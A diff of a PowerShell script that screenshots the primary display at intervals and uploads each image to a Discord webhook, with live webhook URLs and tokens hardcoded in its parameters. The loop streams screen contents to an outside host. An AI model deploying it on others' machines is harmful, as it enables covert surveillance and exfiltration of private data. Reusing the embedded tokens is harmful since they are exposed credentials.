@@ -1,26 +1,12 @@
 <#
 .SYNOPSIS
-    Captures screenshots at set intervals and sends them to a Discord webhook.
-.DESCRIPTION
-    Uses PowerShell to capture screenshots, compress them (optional), and send them to a Discord webhook.
-.PARAMETER IntervalMinutes
-    How often (in minutes) to capture screenshots.
-.PARAMETER WebhookUrl
-    The Discord webhook URL to send screenshots to.
-.PARAMETER OutputFolder
-    Local folder to save screenshots before sending.
-.PARAMETER Compress
-    Whether to compress screenshots (default: $false).
-.PARAMETER MaxFileSizeMB
-    Maximum file size (in MB) for compression (default: 1).
+    Captures screenshots and sends them to a Discord webhook.
 #>
 
 param (
     [int]$IntervalMinutes = 5,
-    [string]$WebhookUrl = "https://discord.com/api/webhooks/1448006524709634252/nhS2qlWoZ2pKgVAtf3675E17U4WNeN6fFIvzRQoL-_r0RONmW7BUQuhuFwumwK6oz0Lv",
-    [string]$OutputFolder = "C:\Temp\Screenshots",
-    [switch]$Compress,
-    [int]$MaxFileSizeMB = 1
+    [string]$WebhookUrl = "https://discord.com/api/webhooks/1448080213845217293/5Rjf-sQfcxxSq94k37-ijS7Pj3F1vr7l3SzLrWtRljJbyYYQvhZFBViBHQuqF_2kwlru",
+    [string]$OutputFolder = "C:\Temp\Screenshots"
 )
 
 # Create output folder if it doesn't exist
@@ -34,99 +20,23 @@ function Capture-Screenshot {
         [string]$OutputPath
     )
 
-    # Load required assemblies for screenshot capture
-    Add-Type -TypeDefinition @"
-using System;
-using System.Drawing;
-using System.Drawing.Imaging;
-using System.Runtime.InteropServices;
-
-public class ScreenCapture {
-    [DllImport("user32.dll")]
-    public static extern IntPtr GetDesktopWindow();
-
-    [DllImport("user32.dll")]
-    public static extern IntPtr GetWindowDC(IntPtr hWnd);
-
-    [DllImport("gdi32.dll")]
-    public static extern IntPtr CreateCompatibleDC(IntPtr hDC);
-
-    [DllImport("gdi32.dll")]
-    public static extern IntPtr CreateCompatibleBitmap(IntPtr hDC, int nWidth, int nHeight);
-
-    [DllImport("gdi32.dll")]
-    public static extern IntPtr SelectObject(IntPtr hDC, IntPtr hObject);
-
-    [DllImport("gdi32.dll")]
-    public static extern IntPtr DeleteObject(IntPtr hObject);
-
-    [DllImport("gdi32.dll")]
-    public static extern IntPtr DeleteDC(IntPtr hDC);
-
-    [DllImport("user32.dll")]
-    public static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);
-
-    public static Bitmap CaptureScreen() {
-        IntPtr desktop = GetDesktopWindow();
-        IntPtr dc = GetWindowDC(desktop);
-        IntPtr bitmapDC = CreateCompatibleDC(dc);
-        IntPtr screenBitmap = CreateCompatibleBitmap(dc, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
-        IntPtr oldBitmap = SelectObject(bitmapDC, screenBitmap);
-        Graphics graphics = Graphics.FromImage(new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height));
-        graphics.DrawImage(new Bitmap(screenBitmap, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)), 0, 0);
-        SelectObject(bitmapDC, oldBitmap);
-        DeleteObject(screenBitmap);
-        DeleteDC(bitmapDC);
-        ReleaseDC(desktop, dc);
-        graphics.Dispose();
-        return new Bitmap(new Bitmap(new Bitmap(screenBitmap, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))));
-    }
-}
-"@
-
     try {
-        $bitmap = [ScreenCapture]::CaptureScreen()
-        $filename = "$OutputFolder\Screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
-        $bitmap.Save($filename, [System.Drawing.Imaging.ImageFormat]::Png)
-        Write-Host "Screenshot saved to $filename"
-        return $filename
+        Add-Type -AssemblyName System.Windows.Forms
+        Add-Type -AssemblyName System.Drawing
+
+        $screenBounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+        $bitmap = New-Object System.Drawing.Bitmap($screenBounds.Width, $screenBounds.Height)
+        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+        $graphics.CopyFromScreen($screenBounds.Location, [System.Drawing.Point]::Empty, $screenBounds.Size)
+        $graphics.Dispose()
+
+        $bitmap.Save($OutputPath, [System.Drawing.Imaging.ImageFormat]::Png)
+        Write-Host "Screenshot saved to $OutputPath"
+        return $OutputPath
     }
     catch {
         Write-Error "Failed to capture screenshot: $_"
         return $null
-    }
-}
-
-# Function to compress image (optional)
-function Compress-Image {
-    param (
-        [string]$InputPath,
-        [string]$OutputPath,
-        [int]$MaxSizeMB
-    )
-
-    $image = [System.Drawing.Image]::FromFile($InputPath)
-    $quality = 100
-    $stream = New-Object System.IO.MemoryStream
-    $encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
-    $encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, $quality)
-
-    # Calculate current size in bytes
-    $currentSize = (Get-Item $InputPath).Length
-
-    # If image is too large, compress it
-    if ($currentSize -gt ($MaxSizeMB * 1MB)) {
-        $encoder = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq "image/jpeg" }
-        $image.Save($stream, $encoder[0], $encoderParams)
-        $stream.Position = 0
-        $compressedImage = [System.Drawing.Image]::FromStream($stream)
-
-        # Save compressed image
-        $compressedImage.Save($OutputPath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
-        Write-Host "Compressed image saved to $OutputPath"
-    }
-    else {
-        Copy-Item -Path $InputPath -Destination $OutputPath -Force
     }
 }
 
@@ -136,22 +46,22 @@ function Send-DiscordWebhook {
         [string]$ImagePath
     )
 
-    $fileBytes = [System.IO.File]::ReadAllBytes($ImagePath)
-    $base64String = [System.Convert]::ToBase64String($fileBytes)
-
-    $payload = @{
-        embeds = @(
-            @{
-                title = "New Screenshot"
-                description = "Automated screenshot capture at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
-                image = @{
-                    url = "data:image/png;base64,$base64String"
-                }
-            }
-        )
-    } | ConvertTo-Json
-
     try {
+        $fileBytes = [System.IO.File]::ReadAllBytes($ImagePath)
+        $base64String = [System.Convert]::ToBase64String($fileBytes)
+
+        $payload = @{
+            embeds = @(
+                @{
+                    title = "New Screenshot"
+                    description = "Automated screenshot capture at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+                    image = @{
+                        url = "data:image/png;base64,$base64String"
+                    }
+                }
+            )
+        } | ConvertTo-Json
+
         Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $payload -ContentType "application/json"
         Write-Host "Screenshot sent to Discord webhook successfully."
     }
@@ -174,21 +84,8 @@ while ($true) {
         continue
     }
 
-    # Compress if enabled
-    if ($Compress) {
-        $compressedFile = "$OutputFolder\Screenshot_$timestamp_compressed.jpg"
-        Compress-Image -InputPath $capturedFile -OutputPath $compressedFile -MaxSizeMB $MaxFileSizeMB
-        $fileToSend = $compressedFile
-    }
-    else {
-        $fileToSend = $capturedFile
-    }
-
     # Send to Discord webhook
-    Send-DiscordWebhook -ImagePath $fileToSend
-
-    # Clean up (optional)
-    Remove-Item -Path $fileToSend -Force -ErrorAction SilentlyContinue
+    Send-DiscordWebhook -ImagePath $capturedFile
 
     # Wait for next interval
     Write-Host "Waiting $IntervalMinutes minutes before next capture..."
